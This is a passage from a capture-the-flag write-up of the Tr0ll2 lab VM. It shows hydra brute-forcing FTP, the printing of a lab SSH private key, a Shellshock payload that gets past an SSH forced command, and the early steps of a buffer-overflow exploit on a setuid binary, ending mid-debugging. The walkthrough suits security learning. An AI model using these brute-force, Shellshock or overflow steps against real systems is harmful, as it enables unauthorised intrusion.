<p>The resultant output appeared to be a wordlist. A big one too. In fact, it has <strong>99157</strong> entires in it. At this stage I was really hoping that I did not have to use this to brute force the ftp or ssh service. That would take forever! After a <code>sort | uniq</code>, the size was reduced to <strong>73128</strong> which was still too much.</p>

<p>I decided to scroll through the list to see if I can spot anything out of the ordinary. My eyes started to feel very tired and not in the mood to go through all of this, but I persisted and eventually noticed a entry <strong>ItCantReallyBeThisEasyRightLOL</strong> on line 34164 that was not similar in pattern to the other words. This one was not a web directory :P</p>

<p>My guess was that this has to be a password for either the FTP or SSH service.</p>

<h2>ftpee</h2>

<p>I now had what I assumed was a password. No other web related hints had me focussing there and I started to doubt my findings.</p>

<p>As a last resort, I started to get together a wordlist that I could give to hydra to chew on. My idea was to grab all of the strings from the web service, including the one found in <code>answer.txt</code>, mutate it a bit and hand it over to hydra to do its work.</p>

<p>My approach to compiling the list basically boiled down to appending everything I could find (including HTML sources) as strings into a file. Once I had that, I ran <code>cat wordz |  tr "\"' " '\n' | sort -u &gt;&gt; words</code> to break it up into a wordlist. Lastly I took the entries had a <code>_</code> in them and broke them up as single words ie: <code>cat_the_troll.jpg</code> turned into <code>cat</code>, <code>the</code>, <code>troll</code>. The resultant list can be seen <a href="https://gist.github.com/leonjza/db5cc19cd62b270a89db">here</a></p>

<p>And finally, it was time to let hydra on the loose.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# hydra -v -V -F -L words -P words -t 30 ftp://192.168.56.101
</span><span class='line'>Hydra v7.6 <span class="o">(</span>c<span class="o">)</span>2013 by van Hauser/THC <span class="p">&amp;</span> David Maciejak - <span class="k">for </span>legal purposes only
</span><span class='line'>
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2014-10-10 08:11:50
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> 30 tasks, 1 server, 13689 login tries <span class="o">(</span>l:117/p:117<span class="o">)</span>, ~456 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ftp on port 21
</span><span class='line'><span class="o">[</span>VERBOSE<span class="o">]</span> Resolving addresses ... <span class="k">done</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;&gt;&quot;</span> - pass <span class="s2">&quot;&gt;&quot;</span> - 1 of 13689 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;&gt;&quot;</span> - pass <span class="s2">&quot;404&quot;</span> - 2 of 13689 <span class="o">[</span>child 1<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;&gt;&quot;</span> - pass <span class="s2">&quot;again&quot;</span> - 3 of 13689 <span class="o">[</span>child 2<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;&gt;&quot;</span> - pass <span class="s2">&quot;agent&quot;</span> - 4 of 13689 <span class="o">[</span>child 3<span class="o">]</span>
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;Tr0ll&quot;</span> - pass <span class="s2">&quot;Tr0ll&quot;</span> - 10621 of 13689 <span class="o">[</span>child 4<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;Tr0ll&quot;</span> - pass <span class="s2">&quot;tr0ll2&quot;</span> - 10622 of 13689 <span class="o">[</span>child 8<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;Tr0ll&quot;</span> - pass <span class="s2">&quot;tr0ll_again.jpg&quot;</span> - 10623 of 13689 <span class="o">[</span>child 23<span class="o">]</span>
</span><span class='line'><span class="o">[</span>21<span class="o">][</span>ftp<span class="o">]</span> host: 192.168.56.101   login: Tr0ll   password: Tr0ll
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> attack finished <span class="k">for </span>192.168.56.101 <span class="o">(</span>valid pair found<span class="o">)</span>
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> finished at 2014-10-10 08:29:08
</span></code></pre></td></tr></table></div></figure>


<p>After a really, really long time, we finally get a successful combination of <code>Tr0ll:Tr0ll</code>. Guess I could have guessed that but oh well. Lets see if this gives us any access:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ftp 192.168.56.101
</span><span class='line'>Connected to 192.168.56.101.
</span><span class='line'>220 Welcome to Tr0ll FTP... Only noobs stay <span class="k">for </span>a <span class="k">while</span>...
</span><span class='line'>Name <span class="o">(</span>192.168.56.101:root<span class="o">)</span>: Tr0ll
</span><span class='line'>331 Please specify the password.
</span><span class='line'>Password:
</span><span class='line'>230 Login successful.
</span></code></pre></td></tr></table></div></figure>


<p>Yay! Progress! Lets take a closer look&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt; pas
</span><span class='line'>Passive mode on.
</span><span class='line'>
</span><span class='line'>ftp&gt; ls
</span><span class='line'>227 Entering Passive Mode <span class="o">(</span>192,168,56,101,73,4<span class="o">)</span>
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>-rw-r--r--    1 0        0            1474 Oct 04 01:09 lmao.zip
</span><span class='line'>226 Directory send OK.
</span><span class='line'>
</span><span class='line'>ftp&gt; get lmao.zip
</span><span class='line'><span class="nb">local</span>: lmao.zip remote: lmao.zip
</span><span class='line'>227 Entering Passive Mode <span class="o">(</span>192,168,56,101,105,73<span class="o">)</span>
</span><span class='line'>150 Opening BINARY mode data connection <span class="k">for </span>lmao.zip <span class="o">(</span>1474 bytes<span class="o">)</span>.
</span><span class='line'>226 Transfer complete.
</span><span class='line'>1474 bytes received in 0.00 secs <span class="o">(</span>621.0 kB/s<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>ftp&gt; bye
</span><span class='line'>221 Goodbye.
</span></code></pre></td></tr></table></div></figure>


<h1>noob key</h1>

<p>We find ourselves with a zip archive called <code>lmao.zip</code>. A encrypted one :(</p>

<p>I tried a few passwords from the wordlist that I had built earlier and eventually got to the word we got out of <code>answer.txt</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/troll2# unzip lmao.zip
</span><span class='line'>Archive:  lmao.zip
</span><span class='line'><span class="o">[</span>lmao.zip<span class="o">]</span> noob password: <span class="c">#ItCantReallyBeThisEasyRightLOL</span>
</span><span class='line'>  inflating: noob
</span><span class='line'>
</span><span class='line'>root@kali:~# cat noob
</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
</span><span class='line'>yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
</span><span class='line'>/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
</span><span class='line'>q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
</span><span class='line'>z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
</span><span class='line'>e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
</span><span class='line'>u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
</span><span class='line'>gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
</span><span class='line'>UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
</span><span class='line'>La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
</span><span class='line'>xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
</span><span class='line'>aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
</span><span class='line'>K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
</span><span class='line'>n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
</span><span class='line'>TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
</span><span class='line'>WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
</span><span class='line'>ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
</span><span class='line'>0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
</span><span class='line'>vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
</span><span class='line'>ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
</span><span class='line'>th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
</span><span class='line'>G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
</span><span class='line'>q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
</span><span class='line'>vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
</span><span class='line'><span class="nv">zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g</span><span class="o">==</span>
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span></code></pre></td></tr></table></div></figure>


<p>A unencrypted private key! Called <code>noob</code>. I guessed <code>noob</code> may be the username, so I fixed up the permissions on the key and tried my luck:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/troll2# chmod 600 noob
</span><span class='line'>root@kali:~/Desktop/troll2# ssh noob@192.168.56.101 -i noob
</span><span class='line'>TRY HARDER LOL!
</span><span class='line'>Connection to 192.168.56.101 closed.
</span></code></pre></td></tr></table></div></figure>


<h2>shocking isn&rsquo;t it</h2>

<p>Surprise surprise. It seemed like we are in fact authenticating, but we don&rsquo;t have a shell. I figured one of two things could be happening here. First, the <code>.bashrc</code> may have been modified with something that echoes the text <code>TRY HARDER LOL!</code> and exits, or there is some restriction on the SSH key for <code>noob</code>.</p>

<p>My first attempts were to specify a command with <code>-t</code> as <code>/bin/bash</code>, but this did not work.</p>

<p>With the current buzz around the recently disclosed <em>shellshock</em> bug, I thought I&rsquo;d try it assuming its a key restriction:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh noob@192.168.56.101 -i noob -t <span class="s1">&#39;() { :;}; /bin/bash&#39;</span>
</span><span class='line'>noob@Tr0ll2:~<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Shocking :) To confirm, the <code>authorized_keys</code> file has the entry <code>command="echo TRY HARDER LOL!"</code> before the public key.</p>

<h2>which door leads to r00t</h2>

<p>With shell access to the machine, it was time to start enumerating and learn more about what we are facing next. Nothing particularly interesting popped up, until I noticed a directory <code>/nothing_to_see_here</code>.</p>

<p><code>/nothing_to_see_here</code> had another directory inside of it <code>choose_wisely/</code> with another 3 sub directories called <code>door1</code>, <code>door2</code> and <code>door3</code>.</p>

<p>All 3 &lsquo;doors&rsquo; had a setuid binary called <code>r00t</code>. I ran the first one which had the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1<span class="nv">$ </span>./r00t
</span><span class='line'>Good job, stand by, executing root shell...
</span><span class='line'>BUHAHAHA NOOB!
</span><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3<span class="nv">$ </span>
</span><span class='line'>Broadcast message from noob@Tr0ll2
</span><span class='line'>    <span class="o">(</span>/dev/pts/0<span class="o">)</span> at 0:48 ...
</span><span class='line'>
</span><span class='line'>The system is going down <span class="k">for </span>reboot NOW!
</span><span class='line'>Connection to 192.168.56.101 closed by remote host.
</span><span class='line'>Connection to 192.168.56.101 closed.
</span></code></pre></td></tr></table></div></figure>


<p>Dam. The VM promptly rebooted. Obviously I need to be a little more careful :D</p>

<p>The machine rebooted and I logged in again as <code>noob</code>, changing directories to the <code>r00t</code> binaries. I tried to run <code>strings</code> on them, but it seems like the command was unavailable. No worries, next on the list was <code>od</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely<span class="nv">$ </span>od -S 1 door3/r00t
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>0001214 __libc_start_main
</span><span class='line'>0001236 GLIBC_2.0
</span><span class='line'>0001320 R
</span><span class='line'>0001453 Q
</span><span class='line'>0001521 %
</span><span class='line'>0001526 h
</span><span class='line'>0001626 h
</span><span class='line'>0001646 h<span class="o">(</span>
</span><span class='line'>0002066 t<span class="p">&amp;</span>
</span><span class='line'>0002073 <span class="err">&#39;</span>
</span><span class='line'>0002305 i
</span><span class='line'>0002620 Good job, stand by, executing root shell...
</span><span class='line'>0002674 BUHAHAHA NOOB!
</span><span class='line'>0002713 /sbin/reboot
</span><span class='line'>0002733 <span class="p">;</span>0
</span><span class='line'>0002750 L
</span><span class='line'>0002760 p
</span><span class='line'>0003025 zR
</span><span class='line'>0003044
</span><span class='line'>0003060 p
</span><span class='line'>0003077 x
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>So this is the binary that simply rebooted the machine. What is weird though is that this <code>r00t</code> binary was in <code>door1/</code> prior to the reboot. I continued to check out the other binaries, when suddenly the folder containing all of the files disappeared and reappeared. After this all of the <code>r00t</code> binaries were shuffled around again.</p>

<p>This was only a minor annoyance and I had enough time to check out the binaries using <code>od</code> to figure out which one I should be looking at. The other binary that would have been a problem appears to chmod /bin/ls so that it becomes unusable. Lucky I missed that one.</p>

<h2>bof bof bof your boat&hellip;</h2>

<p>I copied the binary of interest to <code>/tmp</code> so that I wont be bothered by the shuffling thing that was going on again. Most importantly the one of interest was slightly bigger in size compared to the others so it was easy to identify it apart from the others.</p>

<p>With the binary in <code>/tmp</code>, <code>noob</code> was the owner. For testing purposes this was ok as the exploit should work the same with the one with the desired permissions.</p>

<p>To check the security applied to the binary at compile time, I copied it off using <code>xxd</code> to my local machine and checked it out.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gdb -q ./r00t
</span><span class='line'>Reading symbols from /root/Desktop/troll2/r00t...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : disabled
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : Partia
</span></code></pre></td></tr></table></div></figure>


<p>No security? EZ PEZE.</p>

<p>Next, it was time to start fuzzing the binary and see if it has any interesting behavior:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; * 500&#39;</span><span class="k">)</span>
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p>500 &ldquo;A&rdquo;&rsquo;s, and we have a crash. Perfect. It also seems like a really easy buffer overflow vulnerability. I quickly checked that ASLR was not enabled. If it is not, I planned on popping this one with a ret2libc attack.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>ldd ./r00t
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7fff000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb7e4e000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x80000000<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>ldd ./r00t
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7fff000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb7e4e000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x80000000<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Both entries returned the same address for libc, indicating that ASLR was not enabled :)
Tr0ll2 was also nice enough to include <code>gdb</code>, making the exploit development process very easy.</p>

<h2>the exploit</h2>

<p>With all of the information gathered so far about this particularly interesting <code>r00t</code> binary, it was time to quickly write the overflow exploit to attempt and spawn us a root shell.</p>

<p>First, we have to inspect the crash when we send those 500 A&rsquo;s</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>gdb -q ./r00t
</span><span class='line'>Reading symbols from /tmp/r00t...done.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; * 500&#39;</span><span class="k">)</span>
</span><span class='line'>Starting program: /tmp/r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; * 500&#39;</span><span class="k">)</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x41414141 in ?? <span class="o">()</span>
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x <span class="nv">$eip</span>
</span><span class='line'>0x41414141: Cannot access memory at address 0x41414141
</span></code></pre></td></tr></table></div></figure>


<p>We see that we have cleanly overwritten EIP with our hex representation of A&rsquo;s. We don&rsquo;t know the exact location of where this is overwritten from our input yet, so lets find out by providing it a unique buffer using the metasploit <code>pattern_create</code> script, and then checking the offset using the <code>pattern_offset</code> script.</p>

<p>Lets generate the pattern.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# locate pattern_create
</span><span class='line'>/usr/share/metasploit-framework/tools/pattern_create.rb
</span><span class='line'>
</span><span class='line'>root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 500
</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
</span></code></pre></td></tr></table></div></figure>


<p>Next, we provide this pattern as input to crash the application and inspect the registers:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>gdb -q ./r00t
</span><span class='line'>Reading symbols from /tmp/r00t...done.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r <span class="s2">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&quot;</span>
</span><span class='line'>
